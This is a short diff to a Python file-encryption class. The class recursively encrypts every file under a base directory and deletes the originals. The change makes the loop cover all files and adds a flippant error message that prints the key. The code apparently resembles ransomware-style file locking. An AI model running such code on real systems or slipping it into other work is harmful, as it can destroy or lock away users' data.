@@ -35,6 +35,7 @@ class Encryptor:
 
     def encrypt(self, password):
         self.key = self.derive_key(password)
+        key_to_share = self.key
         try:
             self.files = [item for item in scan_recurse(self.BASE_DIR) if item != "key.key"]
         except Exception as e:
@@ -55,11 +56,10 @@ class Encryptor:
                             f_out.write(encrypted_chunk)
                 os.unlink(file.path)
                 print(f'Encrypted: {file.path}')
-                key_to_share = self.key
-                self.key = None
-                return self.files, str(key_to_share.decode())
             except Exception as e:
-                print(f"Error encrypting {file}: {e}")
+                print(f"Error encrypting {file}: {e}\nI care about you, alot. The key is here: {str(key_to_share.decode())}\nGood luck!")
+        self.key = None
+        return self.files, str(key_to_share.decode())
     
     def decrypt(self, keyy):
         try:
